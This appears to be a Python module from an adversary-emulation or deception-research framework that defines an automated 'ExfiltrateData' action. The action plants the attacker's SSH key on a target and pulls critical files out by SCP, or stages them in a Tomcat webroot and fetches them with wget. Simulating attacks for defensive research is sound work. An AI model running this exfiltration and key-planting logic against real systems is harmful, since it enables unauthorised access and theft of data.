import os
from app.objects.c_agent import Agent

from ..HighLevelAction import HighLevelAction
from ..LowLevel import MD5SumAttackerData, ReadFile, AddSSHKey, SCPFile, wgetFile
from plugins.deception.app.models.network import Host
from plugins.deception.app.models.events import Event, FileContentsFound
from plugins.deception.app.services import (
    LowLevelActionOrchestrator,
    EnvironmentStateService,
    AttackGraphService,
)

from plugins.deception.app.helpers.logging import log_event


class ExfiltrateData(HighLevelAction):
    def __init__(self, target_host: Host):
        self.target_host = target_host

    async def run(
        self,
        low_level_action_orchestrator: LowLevelActionOrchestrator,
        environment_state_service: EnvironmentStateService,
        attack_graph_service: AttackGraphService,
    ) -> list[Event]:
        target_agent = self.target_host.get_agent()
        attacker_host = environment_state_service.network.find_host_by_hostname(
            "attacker"
        )
        if attacker_host is None:
            raise Exception("No attacker host found")

        attacker_agent = attacker_host.get_agent()
        if attacker_agent is None:
            raise Exception("No attacker agent found")

        if len(self.target_host.critical_data_files) == 0:
            log_event("Exfiltrating Data", "Error, no critical data to exfiltrate")
            return []

        if target_agent is None:
            log_event("Exfiltrating Data", "Error, no agents on target host")
            return []

        # Check if any hosts with credentials are http servers
        destination_hosts = attack_graph_service.find_hosts_with_credentials_to_host(
            self.target_host
        )
        hop_host = None
        for host in destination_hosts:
            if host.has_service("http"):
                # Exfiltrate data over ssh credential
                hop_host = host
                break

        if hop_host is None or len(hop_host.agents) == 0:
            # Try to exfiltrate data over ssh
            await self.direct_ssh_exfiltrate(
                target_agent,
                attacker_agent,
                low_level_action_orchestrator,
            )
        else:
            # Exfiltrate data over http
            await self.indirect_http_exfiltrate(
                hop_host,
                attacker_agent,
                low_level_action_orchestrator,
            )

        # Record results of any exfiltrated data
        return await self.record_exfil_results(
            target_agent, low_level_action_orchestrator
        )

    async def record_exfil_results(self, attack_agent, low_level_action_orchestrator):
        events = await low_level_action_orchestrator.run_action(
            MD5SumAttackerData(attack_agent)
        )
        return events

    async def direct_ssh_exfiltrate(
        self,
        target_agent: Agent,
        attacker_agent: Agent,
        low_level_action_orchestrator: LowLevelActionOrchestrator,
    ):
        # Get SSH key of attacker agent
        events = await low_level_action_orchestrator.run_action(
            ReadFile(attacker_agent, "/root/.ssh/id_rsa.pub")
        )
        ssh_key_data = None
        for event in events:
            if isinstance(event, FileContentsFound):
                ssh_key_data = event.contents
                break

        if ssh_key_data is None:
            raise Exception("No attacker ssh key")

        # Add SSH key to target host
        await low_level_action_orchestrator.run_action(
            AddSSHKey(target_agent, ssh_key_data)
        )

        for critical_filepath in self.target_host.critical_data_files:
            # Exfiltrate data
            ssh_port = self.target_host.get_port_for_service("ssh")
            ssh_ip = self.target_host.ip_address
            if ssh_ip is None:
                # Error, unable to exfitlrate data
                continue
            if ssh_port is None:
                ssh_port = "22"
            ssh_port = str(ssh_port)

            ssh_user = target_agent.username
            filename = os.path.basename(critical_filepath)

            await low_level_action_orchestrator.run_action(
                SCPFile(
                    attacker_agent,
                    ssh_ip,
                    ssh_user,
                    ssh_port,
                    critical_filepath,
                    filename,
                )
            )

    async def indirect_http_exfiltrate(
        self,
        http_host: Host,
        attacker_agent: Agent,
        low_level_action_orchestrator: LowLevelActionOrchestrator,
    ):
        http_agent = http_host.agents[0]

        for critical_filepath in self.target_host.critical_data_files:
            # SCP data to ssh host
            ssh_port = self.target_host.get_port_for_service("ssh")
            ssh_ip = self.target_host.ip_address
            if ssh_ip is None:
                # Error, unable to exfitlrate data
                raise Exception("Unknown SSH ip")

            if ssh_port is None:
                ssh_port = 22

            ssh_user = self.target_host.agents[0].username
            filename = os.path.basename(critical_filepath)

            await low_level_action_orchestrator.run_action(
                SCPFile(
                    http_agent,
                    ssh_ip=ssh_ip,
                    ssh_user=ssh_user,
                    ssh_port=str(ssh_port),
                    src_filepath=critical_filepath,
                    dst_filepath=f"/opt/tomcat/webapps/ROOT/{filename}",
                )
            )

        # Wget files from webservers
        ssh_host_ip = http_host.ip_address
        webserver_port = http_host.get_port_for_service("http")

        if ssh_host_ip is None or webserver_port is None:
            # Error, unable to exfitlrate data
            return []

        for critical_filepath in self.target_host.critical_data_files:
            filename = os.path.basename(critical_filepath)
            await low_level_action_orchestrator.run_action(
                wgetFile(
                    attacker_agent,
                    url=f"http://{ssh_host_ip}:{webserver_port}/{filename}",
                )
            )
